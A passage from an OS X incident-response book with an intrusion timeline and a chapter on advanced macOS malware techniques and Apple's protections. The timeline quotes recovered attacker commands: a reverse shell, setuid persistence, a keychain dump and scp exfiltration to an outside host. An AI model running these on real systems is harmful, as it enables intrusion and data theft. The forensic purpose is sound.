j	 2015-12-11T06:55:49 iTunesBackup written/modified
j	 Description
–	 Bash script that ensures backdoor is running. If it’s not running 
it starts it, if it’s been deleted it downloads and executes the 
backdoor. Script recovered from memory.
j	 2015-12-11T06:55:49, birth, /Users/mike/Library/.backups/
iTunesBackup
j	 2015-12-11T06:55:49, modified, /Users/mike/Library/.backups/
iTunesBackup
j	 2015-12-11T06:55:50 iTunesBackup Changed and executed
j	 2015-12-11T06:55:50, changed, /Users/mike/Library/.backups/
iTunesBackup
j	 Process details
–	 mike 2498 10:55PM /bin/bash /Users/mike/Library/.backups/
iTunesBackup
j	 2015-12-11T06:55:55 iTunesHelperModule.plist written
j	 Description
–	 Launch agent that points to iTunesBackup bash script. 
LaunchAgent executes iTunesBackup every 30 s
j	 2015-12-11T06:55:55, accessed, /Users/mike/Library/LaunchAgents/
com.apple.iTunesHelperModule.plist

December 2015 Intrusion Timeline
225
j	 2015-12-11T06:55:55, birth, /Users/mike/Library/LaunchAgents/
com.apple.iTunesHelperModule.plist
j	 2015-12-11T06:55:55, changed, /Users/mike/Library/LaunchAgents/
com.apple.iTunesHelperModule.plist
j	 2015-12-11T06:55:55 iTunesSupport is Written and executed
j	 Description
–	 Backdoor connected to 211.77.5.37. Written in python
j	 2015-12-11T06:55:55, birth, /Users/mike/Library/iTunesSupport
j	 2015-12-11T06:55:55, changed, /mike/mike/Library/iTunesSupport
j	 2015-12-11T06:55:55, modified, /mike/mike/Library/iTunesSupport
j	 Process and connection details
–	 mike 2513 0.0 0.1 2450644 1900 ?? S 10:55PM 10:32.57 python /
Users/mike/Library/iTunesSupport
–	 Python 2513 mike 192.168.0.14:54121- > 211.77.5.37 
(ESTABLISHED)
j	 2015-12-11T07:05:34 ns.txt written to disk
j	 Description
–	 File saved by attacker containing netstat output.
j	 2015-12-11T07:05:34, birth, /Users/mike/Downloads/security_
update.app/Contents/Resources/ns.txt
j	 2015-12-11T07:05:37 ns.txt modified
j	 2015-12-11T07:05:37, changed, /Users/mike/Downloads/security_
update.app/Contents/Resources/ns.txt
j	 2015-12-11T07:05:37, modified, /Users/mike/Downloads/security_
update.app/Contents/Resources/ns.txt
j	 2015-12-11T07:05:45 ps.txt written
j	 Description
–	 File saved by attacker containing ps aux output.
j	 2015-12-11T07:05:45, birth, /Users/mike/Downloads/security_
update.app/Contents/Resources/ps.txt
j	 2015-12-11T07:05:45, changed, /Users/mike/Downloads/security_
update.app/Contents/Resources/ps.txt
j	 2015-12-11T07:05:45, modified, /Users/mike/Downloads/security_
update.app/Contents/Resources/ps.txt
j	 Relevant strings from memory
–	 ps aux > ps.txt
j	 2015-12-11T07:06:26 arp.txt written to disk
j	 Description
–	 File saved by attacker containing the contents of arp.txt

CHAPTER 10: 
The Timeline
226
j	 2015-12-11T07:06:26, birth, /Users/mike/Downloads/security_
update.app/Contents/Resources/arp.txt
j	 Relevant strings from memory
–	 arp -a > arp.txt
j	 2015-12-11T07:06:32 arp.txt modified
j	 2015-12-11T07:06:32, changed, /Users/mike/Downloads/security_
update.app/Contents/Resources/arp.txt
j	 2015-12-11T07:06:32, modified, /Users/mike/Downloads/security_
update.app/Contents/Resources/arp.txt
j	 2015-12-11T07:06:50 ps.txt accessed
j	 2015-12-11T07:05:50, accessed, /Users/mike/Downloads/security_
update.app/Contents/Resources/ps.txt
j	 2015-12-11T07:06:54 ns.txt accessed
j	 2015-12-11T07:14:55, accessed, /Users/mike/Downloads/security_
update.app/Contents/Resources/ns.txt
j	 2015-12-11T07:07:07 sudo command used to run reverse shell is 
executed
j	 Description
–	 Backdoor executed a root shell using the sudo command after the 
sudo password was supplied in a separate TTY.
j	 2015-12-11T07:07:07, SYSLOG, sudo[3005]: mike : TTY = unknown ;  
PWD = /Users/mike/Downloads/security_update.app/Contents/
Resources ; USER = root ; COMMAND = /bin/bash -i
j	 Process details
–	 mike 3296 2513 Thu11PM /bin/sh -c sudo bash -i >& /dev/
tcp/127.0.0.1/1583 0 > &1
j	 root escalation technique used

December 2015 Intrusion Timeline
227
j	 2015-12-11T07:07:25 mac_auth written to disk
j	 Description
–	 binary in which setuid permissions are applied at the root 
level. Likely left by attacker to regain root access if he gets 
kicked out.
j	 2015-12-11T07:07:25, birth, /usr/bin/mac_auth
j	 2015-12-11T07:07:25, accessed, /usr/bin/mac_auth
j	 Relevant strings from memory
–	 mv mac_auth /usr/bin
–	 chmod 4755 /usr/bin/mac_auth
j	 2015-12-11T07:07:48 mac_auth modified
j	 2015-12-11T07:07:48, changed, /usr/bin/mac_auth
j	 2015-12-11T07:07:48, modified, /usr/bin/mac_auth
j	 2015-12-11T07:08:34 Series of important documents accessed
j	 Description
–	 Documents likely exfiled
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/contracts.
docx
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/
customerrecords.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/finances/
budget.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/finances/
partsListAndPrices.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/
presentation/executivepitch.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/contracts.
docx
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/
customerrecords.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/employee_
records.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/ 
patent.xls
j	 2015-12-11T07:08:34, accessed, /Users/mike/Documents/
confidential.xls
j	 2015-12-11T07:08:34 .DS_Store created
j	 Description
–	 Zip file containing archived documents from the local system
j	 2015-12-11T07:08:34, birth, /tmp/.DS_Store

CHAPTER 10: 
The Timeline
228
j	 2015-12-11T07:08:34, changed, /tmp/.DS_Store
j	 2015-12-11T07:08:34, modified, /tmp/.DS_Store
j	 2015-12-11T07:08:50 .DS_Store accessed
j	 2015-12-11T07:13:17, accessed, /tmp/.DS_Store
j	 2015-12-11T07:09:37 kd written to disk
j	 Description
–	 File saved by attacker likely containing the output of keychain 
dump. After this file is executed the vmmap binary is seen 
being accessed. Keychaindump was also found inside of 
memory.
j	 2015-12-11T07:09:37, birth, /Users/mike/Downloads/security_
update.app/Contents/Resources/kd
j	 2015-12-11T07:09:37, modified, /Users/mike/Downloads/security_
update.app/Contents/Resources/kd
j	 Relevant strings from memory
–	 ./kd > 1.txt
j	 2015-12-11T07:10:42 kd changed
j	 2015-12-11T07:10:42, changed, /Users/mike/Downloads/security_
update.app/Contents/Resources/kd
j	 2015-12-11T07:10:44 kd accessed
j	 2015-12-11T07:10:44, accessed, /Users/mike/Downloads/security_
update.app/Contents/Resources/kd
j	 2015-12-11T07:10:48 /usr/bin/vmmap accessed
j	 Description
–	 Built-in tool used to read virtual memory regions increasing the 
likelihood that the “kd” is actually keychaindump
j	 2015-12-11T07:10:48, accessed, /usr/bin/vmmap
j	 2015-12-11T07:10:48 1.txt written
j	 2015-12-11T07:10:48, accessed, /Users/mike/Downloads/security_
update.app/Contents/Resources/1.txt
j	 2015-12-11T07:10:48, birth, /Users/mike/Downloads/security_
update.app/Contents/Resources/1.txt
j	 2015-12-11T07:10:48 1.txt modified
j	 2015-12-11T07:10:48, changed, /Users/mike/Downloads/security_
update.app/Contents/Resources/1.txt
j	 2015-12-11T07:10:48, modified, /Users/mike/Downloads/security_
update.app/Contents/Resources/1.txt

December 2015 Intrusion Timeline
229
j	 2015-12-11T07:12:31 abc written to disk
j	 Description
–	 Unidentified binary. Likely Dave Ghrol hash dumper based on the 
syntax found in memory.
j	 2015-12-11T07:12:31, birth, /Users/mike/Downloads/security_
update.app/Contents/Resources/abc
j	 2015-12-11T07:12:31, modified, /Users/mike/Downloads/security_
update.app/Contents/Resources/abc
j	 Relevant strings from memory
–	 ./abc -j mike > 2.txt
j	 2015-12-11T07:12:37 abc changed
j	 2015-12-11T07:12:37, changed, /Users/mike/Downloads/security_
update.app/Contents/Resources/abc
j	 2015-12-11T07:12:39 abc accessed
j	 2015-12-11T07:12:39, accessed, /Users/mike/Downloads/security_
update.app/Contents/Resources/abc
j	 2015-12-11T07:26:03 osx_patch file share referenced
j	 Description
–	 Errors related to a mounted share from FileServer1 at 
192.168.0.15. Inside of memory more exfil was discovered being 
taken from this system.
j	 2015-12-11T07:26:03, SYSLOG,
–	 mds[76]: (Normal) Volume: volume:0x7fbf99937c00 **********  
Bootstrapped Creating a default store:1  
SpotLoc:(null) SpotVerLoc:(null) occlude:0 /Users/mike/
Downloads/security_update.app/Contents/Resources/ 
osx_patch
j	 2015-12-11T07:26:03, SYSLOG
–	 mds[76]: dnssd_clientstub ConnectToServer: connect()-> No of 
tries: 1
j	 Indicators from memory
–	 mount -t smbfs //mike:p@$$w0rd1843@FileShare1/team_folder 
osx_patch
–	 tar -cvf thumbs.db osx_patch
–	 umount osx_patch
–	 gzip thumbs.db
–	 scp thumbs.db.gz anon@axrgcb.sysclouds.com:∼
–	 srm thumbs.db.gz

CHAPTER 10: 
The Timeline
230
WRAPPING UP
Over the chapters we’ve been working on a collection script that pulls data from 
the compromised system. This script is not meant to be a final product. Take 
it yourself and modify it. Find ways to make it faster, more stable, and more 
thorough. Delete the items you don’t need and add items you think are missing. 
Finally, infect a system with malware, collect the data, and trace your own steps 
to prepare for a real intrusion. This is hands down the best way to learn.
If you’ve been following along, the final collection layout should look some-
thing like this (Figs. 10.1 and 10.2).
FIGURE 10.1

Wrapping Up
231
FIGURE 10.2

CHAPTER 10: 
The Timeline
232

Wrapping Up
233

CHAPTER 10: 
The Timeline
234

Wrapping Up
235

CHAPTER 10: 
The Timeline
236

Wrapping Up
237

CHAPTER 10: 
The Timeline
238

Wrapping Up
239

241
OS X Incident Response﻿
Copyright © 2016 Elsevier Inc. All rights reserved.
Advanced Malware Techniques 
and System Protection
CHAPTER 11
INTRODUCTION
Over the course of this book we’ve studied the basic items that make up OS 
X malware. Most modern day OS X malware consists of some type of execut-
able and an ASEP. It has not yet evolved to be nearly as sophisticated as some 
malware seen on Windows. One of the reasons for this is that it doesn’t have 
to be. Users feel much safer behind the keyboard on their Mac. Security com-
panies also know that far less malware is developed for OS X which makes 
the demand for security tools far lower. These are two of many reasons that 
simplistic OS X malware is able to operate for long periods of time with-
out being detected. There are, however, some more advanced techniques that 
have been seen as well as other stealthy techniques that exist, but are yet to be 
spotted in distributed malware. The analysis chapters throughout this book 
unraveled an intrusion that consisted of only basic malware and “hacky” 
techniques. The attacker was clearly not overly concerned with stealth, but 
this may be the case in many intrusions that you handle. It depends com-
pletely on who’s behind the keyboard and how they operate. In this chapter 
we will touch on some of the advanced techniques that malware has used 
as well as what protection has been put in place by Apple to best minimize 
­different malicious use cases.
ADVANCED MALWARE TECHNIQUES
Dylib Hijacking
Dylib hijacking is a method used to inject malicious code from a shared li-
brary into a running process originally introduced by security researcher Pat-
rick Wardle in 2015. This technique which has existed on Windows for years 
(DLL hijacking) remained untouched for a long time on OS X. After a bit of 

CHAPTER 11: 
Advanced Malware Techniques and System Protection
242
research Wardle revealed that not only could OS X’s dynamic loader fall victim 
to the same attack scenario, but also that a number Apple’s built in Software 
was directly vulnerable to it.
If you have development experience then you may already have an understand-
ing of how dynamic libraries work, but if not, here’s a quick explanation. Dylib 
files on OS X are the equivalent of .dll files on Windows. They are simply files 
containing code that can be imported and used by a program. The program 
that you execute specifies which dynamic libraries it needs in order to run. 
These libraries can be referenced by the program using an absolute path or a 
relative path. Programs that don’t reference libraries with an absolute path can 
fall vulnerable to dylib hijacking (Fig. 11.1).
The aforementioned image shows a program called “myapp” being executed. 
You can see that it looks in two different locations for the myapp.dylib li-
brary. First in the “contents” directory, next in the “framework” directory. This 
program is a great example of a vulnerable app because it does not find the 
necessary dylib in the first directory it searches. This gives an attacker the op-
portunity to supply his own dylib in that directory forcing his malicious code 
to be loaded (Fig. 11.2).
FIGURE 11.1

Advanced Malware Techniques
243
This image shows an attacker that places a malicious dylib in the contents direc-
tory. Myapp then executes the attackers code. From an attacker’s perspective this is 
great. There is only one problem. Since the malicious myapp.dylib was found and 
loaded the myapp program doesn’t even bother loading the real library causing 
the program to crash. The attacker can easily fix this by ensuring that after their 
code is executed, the malicious dylib then loads the legitimate one (Fig. 11.3).
FIGURE 11.2
FIGURE 11.3

CHAPTER 11: 
Advanced Malware Techniques and System Protection
244
The aforementioned image shows an example of a successful dylib hijack 
where the attacker has rigged myapp to execute their malicious code in 
the background which then loads the legitimate dylib. This leaves the user 
completely unaware of what is going on. So why would an attacker bother 
going through all of this trouble instead of just running malware the nor-
mal way?
There are a number of reasons with the most probable being stealth. Using 
this method the malware is loaded by a legitimate program and contained in 
a shared library. This means no new processes are created. Instead, malicious 
code is running inside a known good process. Anything this malware does will 
also appear under the legitimate process making it look less suspicious to a 
security analyst. Another known reason to use dylib hijacking is for bypassing 
security measures. Wardle demonstrated this by showing a bypass for a popu-
lar OS X firewall called “Little Snitch”. Little Snitch is a great program that will 
display popups when a process tries to make an external network connection. 
This popup then gives the user the option to allow or deny that connection. 
Although Little Snitch does not contain any dylib hijacking vulnerabilities, if 
a user has allowed a vulnerable program through the firewall it could be by-
passed. Since the malicious dylib will only be loaded when the program is 
executed, it works in the attacker’s best interest to find a vulnerable application 
that executes at startup.
Scanning for Vulnerable Dylibs
Hopefully by now you’ve gotten the idea that dylib hijacking, when applied 
accurately, could lead to a piece of malware operating unnoticed for a long 
period of time.
Soon after his research, Wardle released a tool called Dynamic Hijack Scan-
ner (DHS). DHS can find dylibs that have already been hijacked as well 
as detect dylibs that are vulnerable. This tool is available on his website at 
www.objective-see.com. This site also features other useful software for find-
ing system ASEPS, viewing installed KEXT files, process monitoring tools 
and more. These tools are incredibly useful when investigating a live system 
via the GUI.
If you’re not logged into the GUI you can still investigate hijacked dylibs 
via the command line. Fortunately for us, dylib hijacking does leave behind 
one very obvious footprint. This footprint is the fact that in order for the 
malicious dylib to be loaded, it must share the same name as the legitimate 
dylib. By looking at the lsof output we can pinpoint processes that have 
loaded two dylibs with the same name. Here is a quick and dirty way of 
searching for this.

Advanced Malware Techniques
245
You may have a lot of results to parse through after running this command. 
Remember that lsof returns all files loaded by processes. Not all of these files 
are dylibs. You could rule out a large number of false positives by running the 
“file” command on the results and focusing only on dynamically linked shared 
library files. In this output we see the number of times the file was loaded by a 
process, the PID, and file name that was loaded. Let’s examine the FileHelper 
file loaded into process 1989. We’ll use lsof and awk to print the process name, 
PID and the full path of the loaded file.
This reveals that two files with the same name have been loaded into the 
vulnerable.app application.

CHAPTER 11: 
Advanced Malware Techniques and System Protection
246
I see that both of these files are dynamic libraries loaded into vulnerable.app 
sharing the same file name. This raises a concern. Both these files should be 
collected for analysis. In this case /Applications/vulnerable.app/Contents/
Frameworks/some.framework/Versions/A/FileHelper is a malicious dylib.
Alternatively, if you have collected a memory dump from the compromised 
system you could use a volatility script that performs the same action.
DYLD_INSERT_LIBRARIES
Another shared library mechanism that can be abused maliciously is the 
DYLD_INSERT_LIBRARIES environment variable. Unlike dylib hijacking, this 
feature was purposely built into the operating system intended to assist devel-
opers in debugging code. However, when used maliciously it can assist mal-
ware authors with hiding their malware from various tools. If you’ve ever used 
LD_PRELOAD on Linux, then you should already be familiar with DYLD_­
INSERT_LIBRARIES. This is actually a simple environment variable that can 
be set to override legitimate functions from other libraries. From a malware 
authors perspective, you want to be able to hide your backdoor so the user is 
less likely to see it. Throughout the analysis sections of this book we discovered 

Advanced Malware Techniques
247
information regarding a python backdoor communicating on port 1583. If the 
attacker had imported a malicious library using DYLD_INSERT_LIBRARIES he 
could have hidden this information by hooking into certain functions. Here’s 
a look at how lsof -i operates before any changes have been applied to DYLD_­
INSERT_LIBRARIES (Fig. 11.4).
After executing “lsof -i” the proc_pidfdinfo function is one of the many 
­functions imported from libsystem_kernel.dylib. lsof then reads the /etc/­
services file and parses it using proc_pidfdinfo before printing the output 
to the ­terminal. This ends up revealing a python script communicating on 
port 1583.
If the attacker wanted to keep this port from being shown by lsof, he could 
have created a malicious dylib containing a proc_pidfdinfo function that ig-
nores port 1583. He can then point DYLD_INSERT_LIBRARIES to his mali-
cious dylib. This could be applied in the user’s .bash_profile forcing it to be 
loaded each time an interactive bash shell is opened.
Now when lsof is executed the proc_pidfdinfo function from the attacker’s 
library will be loaded instead of the standard one (Fig. 11.5).
FIGURE 11.4

CHAPTER 11: 
Advanced Malware Techniques and System Protection
248
The aforementioned image shows that after lsof -i is run the malicious proc_
pidfdinfo() is loaded which results in the filtering of port 1583. We can no 
longer see that the malicious python process is running. The attacker has man-
aged to do this without accessing the kernel and without even having root 
permissions. That being said, if root were to run “lsof -i” the exported DYLD_­
INSERT_LIBRARIES variable would not apply to him and he would see the 
open port. If the attacker wanted to apply this technique system wide he would 
have to manage to get root access and apply the variable to /etc/profile or an-
other location that affects all bash profiles. We collected these files in Chapter 4 
for reasons like this.
DYLD_INSERT_LIBRARIES could also be used as an ASEP technique. Every 
application you install has a property list called “Info.plist”. This property list 
allows for the assigning of environment variables using a key called LSEnviron-
ment. By assigning a DYLD_INSERT_LIBRARIES variable here to this value a 
malicious dylib could be loaded every time the application is opened.
Alternatively, DYLD_INSERT_LIBRARIES could be applied inside of a new or 
existing launch daemon or agent using the “EnvironmentVariables” dictionary.
Many of these DYLD_INSERT_LIBRARIES techniques listed previously are now 
restricted on OS X El Capitan due to System Integrity Protection (SIP) (see next 
section).
Patching Binaries
When root permissions are acquired some malware may refrain from hooking 
libraries. Instead it may replace binaries that already exist on the system. For 
FIGURE 11.5

Advanced Malware Techniques
249
example, the “ls” binary could be replaced with a version of ls that will filter 
out the attacker’s malware files before printing the output to the screen. Attack-
ers have also been known for replacing the SSH binary with a modified version 
that allows for backdoor access. These types of attacks could be easily detected 
by collecting file hashes for system files and bouncing them off a maintained 
hash database such as VirusTotal.
Bash Tricks
Bash allows for a massive amount of customizations to be used while inside 
a shell. Among these customizations are things like aliases, debug scripts, and 
override functions that could all lead to displaying false information to a user 
or even an analyst. Take the following example:
If placed inside the user’s .bash_profile, the ps command will be over-
ridden with this new ps command which will always refrain from show-
ing running python processes. This is a technique that the malware we 
were dealing with over past chapters could have used to better hide itself. 
Bash debug scripts could also be used in attempts to compromise the sudo 
password.
This short debug function if applied to the user’s .bash_profile will intercept the 
execution of the sudo command. It will then post a fake password prompt and 
refrain from returning any characters as the sudo user types in their password. 
Upon pressing enter the user’s password will be printed to /tmp/p.txt and tell 
the user they’ve incorrectly typed the password. The real sudo command will 
then execute and all will appear as normal. These are just two examples of why 
it’s important to know what’s loaded into your bash environment.

CHAPTER 11: 
Advanced Malware Techniques and System Protection
250
SSH authorized_keys
Although a much more popular technique on a public facing Linux server, 
this technique still may be used when gaining access to an OS X system via 
lateral movement. This technique occurs when an attacker takes a public key 
and places it in the ∼/.ssh/authorized_keys file of a compromised system. This 
will allow the attacker to login via ssh without knowing the user’s password. 
From a lateral movement perspective, this is a perfect failsafe to regain access 
to a compromised system that has had the malware removed from it. If SSH is 
not running on the system the attacker would have to enable it which requires 
root permissions.
ADDITIONAL ASEPS
∼/.MacOSX/environment.plist
This property list has not worked since somewhere around OS X Lion. This was 
originally created to allow a user to put environment variables that would be 
loaded into every application opened by the user. Apple deprecated this feature 
for obvious reasons.
Plugins
Application plugins can also be (and have been) abused to execute malware. 
Malicious plugins generally target programs that are frequently opened by us-
ers such as web browsers. The OS X Flashback malware maintained persistence 
by infecting web browser info.plist files if it could acquire root permissions. It 
would do so by using the dyld_insert_library mechanism discussed earlier. If 
it could not acquire root permissions it would infect the user’s ∼/.MacOSX/
environment.plist file instead.
Periodic
Although not a highly advanced ASEP, periodic is a one that is less thought of. 
This persistence mechanism is mainly used for cleaning up temporary files. It’s 
set up with folders containing bash scripts to run daily, weekly, and monthly. 
You can find these scripts in their according directories at /etc/periodic.

System Protection
251
Instead of waiting for these scripts to execute you can also force their execution 
using the periodic command.
The aforementioned command will force all the scripts inside the /etc/­periodic/
daily directory to execute.
SYSTEM PROTECTION
Quarantine and Gatekeeper
The Quarantine feature lets users know when they’re running a new program 
and where it came from. Programs downloaded from the internet will be 
tagged in the extended attributes of the downloaded file as well as the Quaran-
tine database as seen in earlier chapters. When the program is opened the user 
will receive a Quarantine popup (Fig. 11.6).
As you would imagine, most users already know what program they down-
loaded and where it came from. Many users will blow past this prompt with-
out a second thought.
Gatekeeper on the other hand is a feature that keeps unsigned applications 
from executing. This feature is put in place to encourage users to install ap-
plications from the Apple App Store rather than insecurely downloading them 
from websites that could be hosting malicious code.
Gatekeeper takes the Quarantine approach a step further by preventing the ap-
plication from running if it came from an unsigned developer. By default the 
user is not given the option to continue (Fig. 11.7).
FIGURE 11.6

CHAPTER 11: 
Advanced Malware Techniques and System Protection
252
If the user right clicks the application and selects open, they will then be 
presented with the option to continue the install. This won’t keep mal-
ware out all the time, but it does force the user to slow down and read the 
prompts.
Inside the preferences (System Preferences > Security & Privacy > General) 
you can instruct Gatekeeper to only allow apps from the Apple App Store 
(Fig. 11.8).
It should also be noted that gatekeeper is only applied via the GUI. When in-
stalling an application from the terminal, no popups are presented.
Gatekeeper is a relatively effective tool that does a decent job at scaring 
many users from installing an unsigned package acquired from the internet. 
FIGURE 11.8
FIGURE 11.7

System Protection
253
On the downside, you will always end up with users who power through 
these alerts.
X-Protect
X-Protect is Apple’s built in virus scanner. It keeps track of known malware 
hashes and patterns. When a program is executed it is first bounced against X-
Protect rules which are located in the following plist:
/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/­
XProtect.plist
Using the static signatures found in this plist X-Protect can catch malware that 
has already been discovered so long as it has not been modified. Although it’s 
good to see Apple writing a built-in rule engine, any malware author can view 
both the string patterns and hashes that X-Protect is searching for and modify 
their malware accordingly to avoid detection.
Sandbox
All apps installed from the Apple App Store are run in what is known as the OS 
X App Sandbox. The main purposes of the sandbox are to keep applications 

CHAPTER 11: 
Advanced Malware Techniques and System Protection
254
from accessing user data without permission, and to mitigate application vul-
nerabilities. If an application is compromised by an attacker, they would not 
be able to gain full user access to the system (unless the attacker also holds a 
sandbox escape exploit). These sandbox technologies are enforced at the ker-
nel level. Applications that are not installed from the App Store do not run 
inside the App Sandbox.
Important system services also run inside their own custom sandbox such as 
the mdnsresponder service. You can view these custom sandbox profiles inside 
the /usr/share/sandbox directory.
System Integrity Protection
We briefly touched on SIP in Chapter 8 but here we’ll discuss a few more of its 
features. SIP is the latest security mechanism put in place by Apple starting with 
OS X El Capitan. This protection was enabled to help keep root level malware 
from taking over certain parts of the operating system. Although this means 
applying limitations to the root user many find it to be worthwhile trade off. 
Logically, this protection makes good sense. Many Mac laptops are personal 
laptops that belong to a single user who is operating an admin account for ev-
eryday use. If the user slips up and installs something they shouldn’t, the newly 
installed program now has unlimited access to change anything it wants on the 
system. This is where SIP comes in. SIP applies a handful of limitations to what 
this malware can do if it manages to get root access. The most notable of these 
limitations are that users can no longer create, modify, or delete files inside of 
the following four directories:
j	 /System
j	 /bin
j	 /sbin
j	 /usr
As you might suspect, there are exceptions to this rule. You can still create 
files in specific directories that are specified by Apple. The “/System/Library/
Sandbox/rootless.conf” file holds a list of files and directories including Ap-
ple specific applications that cannot be modified; however, any line in this 
file that starts with an asterisk implies that the directory is an exception to 
that rule.

System Protection
255

CHAPTER 11: 
Advanced Malware Techniques and System Protection
256
As you can see although the “/usr” directory cannot be written to, the “/usr/­
local” directory can. Apple has also specified a number of their own Apps at the 
top that can no longer be deleted or modified. Another list of exceptions ex-
ists at “/System/Library/Sandbox/Compatibility.bundle/Contents/Resources/
paths”
The final exception to these rules is that any installer package signed with the 
Apple’s certificate can bypass SIP protection, but only Apple’s certificate. Pack-
ages signed by standard developers will still be rejected when trying to modify 
SIP protected directories.
These SIP exceptions do leave the door open for some interesting ASEP usage. 
You can no longer write LaunchDaemons to the /System/Library/LaunchDae-
mons directory, but if one exists inside the exceptions list and does not yet 
exist on disk it can be created. For example, inside the “paths” file /System/
Library/LaunchDaemons/com.absolute.rpcnet.plist is listed as an exception. 
This is plist that belongs to third party software that you might not necessarily 
have installed on your system. This gives the attacker an opportunity to create 
it themselves to hide in a directory that most analysts will assume is off limits.
You’ll notice that the files and directories specified in the rootless.conf folder 
have a rootless extended attribute associated with them.

System Protection
257
You’ll also notice that the contents of these directories contain a flag called 
rootless. Flags can be viewed using the “ls -lO” command.
SIP handles a number of other limitations as well. As mentioned in Chapter 4 
OS X no longer allows for the loading of unsigned kexts. This feature is man-
aged by SIP. SIP is also responsible for ensuring that no OS X system processes 
are debugged. In Chapter 8 we mentioned that the keychaindump method no 
longer works on El Capitan. This is due to SIP runtime protections on the secu-
rityd process. This also means that Apple put a stop to dtrace inspecting system 
processes. From an incident response perspective this is a bit of a downer as 
dtrace is a powerful tool, but keeping it out of the hands of an attacker could 
be equally important. Dtrace scripts will still operate as long as they don’t try 
to access OS X system processes. SIP has also strongly limited the usage of dyld-
based environment variables.
You can check to see if SIP is enabled at any time by using the csrutil command.
The only way to disable SIP or modify its settings is to put the computer into 
recovery mode and run the following command.

CHAPTER 11: 
Advanced Malware Techniques and System Protection
258
CONCLUSION
As Apple continues to roll out new security mitigations attackers will continue 
to research and discover escapes for them. This is the way the security industry 
works as we have seen time after time particularly on the Windows Operating 
System. OS X is no exception. As analysts we must understand these mitiga-
tions so we can expose zero-day exploits when they occur. This also forces us to 
think outside the box on how legitimate features built into the operating sys-
tem can function in favor of malware authors. Keeping up to date on research, 
advisories, and malware write-ups will greatly assist in identifying malicious 
activity on compromised systems.

259
Subject Index
A
Access control lists (ACLs), 50, 56
ACLs. See Access control lists  
(ACLs) 
Additional commands, 29
diskutil list, 30
du -h, 30
history, 30
mdfind (-name) (-onlyin), 29
nvram, 30
security list-keychains, 30
sysctl (-a), 30
Administrator password, 177
aff4 file, 150
Allocation file, 50
Analysis environment, 9, 138
Analysis scripts, 21, 79, 134
yarafly.sh, 21
anno_attribute_id field, 131
Apple APIs, 3
Apple Developer Library, 3, 94
apple script command, 62
bundle file, 62
Apple System Logs, 87
Apple TVs, 1
APT backdoor, 14
arp (-a) command, 28
arp.txt file, 157, 172
Artifacts, 9, 11, 49, 144
ASEP. See Auto start extensibility 
point (ASEP) 
at command, 106
atq command, 29
attacker timeline, 224, 225, 227, 228
Attributes B-tree, 50
Auto start extensibility point 
(ASEP), 91
awk, 16
B
Backdoors, 157, 209
Backups, 42
Bash code, 162
Bash commands, 12, 25
Bash environment variables, 33
.bash_profile, 247–249
Bash script, 62
Bash tricks, 249
Bash -version command, 26
Binary property lists (bplists), 97, 
188
Block device, 60
Bluetooth device, 60
bplists. See Binary property lists 
(bplists) 
Browser 
history, 134, 137
locations, 132
plugins, 250
timeline, 121
Burrows–Wheeler algorithm, 208
bzip2 compression tools, 208
C
Catalog file, 50
CFBundleIdentifier, 117
CGI scripts, 183
Character device, 60
Chrome, 123
database, 124
downloads, 125
files of interest, 128
history, 124
Chrome danger_type, 125
chrome_download, 224
chrome_history, 223
Chrome History database, 127
Citrix Go to Meeting, 94
C language, 172
C++ language, 172
codesign (-d) (-vv) command,  
30
Collection, 110
file listing, 73
framework, 34
plist files, 110
script, 115
startup property, 110
timestamps, 73
Command and control, 7
Compression tools, 208
Crontab command, 101
Crontab -e command, 101
crontab -l command, 29
cut command, 16
CVE-2013-1775, 182
D
danger_type field, 125
Data breaches, 4
Data exfiltration, 203
data.zip, 18
date command, 25
Dave Grohl tool, 198
defaults command, 99
editing property lists, 99
Directories, 64
Directory permissions, 54
diskutil list command, 30
Ditto tool, 205
command line, 18
DLL hijacking, 241
DNS Changer, 101
DNS lookup, 3

Subject Index
260
Dnssd Domain Name Service System 
Discovery, 88
Download history, 130, 134
Dropbox, 105
dscl command, 39
dscl (. -ls/Users) command, 27
.DS_Store file, 65, 216
dtrace command, 31
du -h command, 30
dump memory, 144
dyld_insert_libraries, 246
Dylib files, 242
Dylib hijacking, 241
Dynamic Hijack Scanner (DHS), 244
E
EFI booter, 92
EFI Boot ROM, 92
egrep command, 15
El Capitan, 257
E-mail, 209
/etc/kcpassword, 192
Exfil, 220
exfiltrator.py, 212
Exploitation, 7
Extended attributes, 54
information storage, 54
xattr command, 54
Extension ID, 128
F
File artifacts, 65
logs and rotation, 65
File command, 30
File extensions, 61
OS X specific, 61
.app, 61
.dmg, 61
.dylib, 61
.kext, 61
.pkg, 61
.plist, 61
File hierarchy layout, 62
/Applications, 62
/bin, 63
/cores, 63
/dev, 64
/etc, 64
/Library, 62
/private, 64
/sbin, 63
/System, 62
/tmp, 64
/Users, 63
/usr, 63
/var, 64
/.vol, 63
/Volumes, 63
File Transfer Protocol,  
209
finger (-m) command, 26
Firefox, 129
files of interest, 132
history, 129
G
Gatekeeper, 251
Google Chrome, 55, 119
browser, 123
Google Drive, 105
Graphical user interface 
(GUI), 2, 244, 252
grep command, 15
groups command, 27
GUI. See Graphical user interface 
(GUI) 
gzip, 208
H
HFS+. See Hierarchical File System 
Plus (HFS+) 
Hidden files, 64
Hierarchical File System Plus (HFS+), 
49, 55
allocation file, 50
attributes B-tree, 50
catalog file, 50
file system, 2
volume header, 50
history command, 30
History.plist file, 121
hostname command, 25
I
id command, 27
IDS. See Intrusion detection systems 
(IDS) 
ifconfig command, 27
Incident response (IR), 4, 11
analyze, 5
detect, 5
prepare, 5
remediate, 6
Inodes, 51
Installation, 7
Internet, 1
Internet Explorer, 119
Inter-process communication (IPC), 
3, 60
Inter-process communication sockets 
(IPCs), 60
Intrusion detection systems  
(IDS), 5
Intrusion timeline, 223–229
iOS devices, 119
IP address, 154
iPads, 1
IPC. See Inter-process 
communication (IPC) 
iPhones, 1
IR. See Incident response (IR) 
J
JAMF software, 10, 93
Javascript, 62
JMicronATA.kext, 115
bundle, 116
K
kcpassword file, 197
KeepAlive key, 96
Kernel Modules, 144
